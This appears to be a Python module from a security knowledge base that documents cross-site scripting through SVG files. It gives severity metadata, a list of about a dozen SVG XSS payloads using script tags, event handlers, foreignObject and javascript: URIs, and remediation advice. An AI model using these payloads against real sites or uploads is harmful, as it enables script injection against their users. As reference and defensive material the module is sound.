#!/usr/bin/env python3
# Project: BRS-KB
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-12-27 UTC
# Status: Refactored
# Telegram: https://t.me/EasyProTech

"""
SVG XSS Context

XSS through SVG file uploads and inline SVG injection.
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in SVG Images",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["svg", "xss", "file-upload", "xml", "injection"],
    "description": """
SVG XSS exploits the fact that SVG files are XML-based and can contain
embedded JavaScript, event handlers, and even foreign HTML content.
Uploaded SVGs can execute scripts when viewed directly in the browser.

SVG is particularly dangerous because:
- It's often allowed as an "image" format
- Contains full scripting capabilities
- Can include <foreignObject> with HTML
- SMIL animations support event handlers
- xlink:href can contain javascript: URIs
""",
    "attack_vector": """
SVG XSS VECTORS:

1. SCRIPT TAGS
   <svg><script>alert(1)</script></svg>

2. EVENT HANDLERS ON SVG ELEMENTS
   <svg onload=alert(1)>
   <svg><rect onclick=alert(1)>

3. FOREIGNOBJECT
   <svg><foreignObject><body onload=alert(1)></foreignObject></svg>

4. ANIMATION HANDLERS
   <svg><animate onbegin=alert(1)>
   <svg><animate onend=alert(1)>
   <svg><set attributeName=onload to=alert(1)>

5. USE ELEMENT
   <svg><use href="data:image/svg+xml,<svg onload=alert(1)>">

6. LINK WITH JAVASCRIPT
   <svg><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>

7. HANDLER ELEMENT
   <svg><handler type="text/javascript">alert(1)</handler></svg>

8. SVG FILTERS
   <svg><filter><feImage xlink:href="javascript:alert(1)"/></filter></svg>

9. SMIL ANIMATIONS
   <svg><animate attributeName=href values="javascript:alert(1)">
""",
    "remediation": """
SVG XSS PREVENTION:

1. SERVE WITH CORRECT HEADERS
   Content-Type: image/svg+xml
   Content-Security-Policy: script-src 'none'

2. SANITIZE SVG FILES
   Use DOMPurify with SVG-specific config
   Strip all script elements
   Remove event handler attributes
   Remove javascript: URIs

3. SEPARATE DOMAIN
   Serve user-uploaded SVGs from sandbox domain
   Prevents cookie access to main domain

4. CONVERT TO RASTER
   Convert SVGs to PNG/JPEG for display
   Eliminates scripting capability

5. STRICT CSP
   Content-Security-Policy: default-src 'none'; img-src 'self'

6. FILE VALIDATION
   Check SVG structure
   Whitelist allowed elements
   Reject files with scripts

7. CONTENT-DISPOSITION
   Content-Disposition: attachment
   Forces download instead of render
""",
}
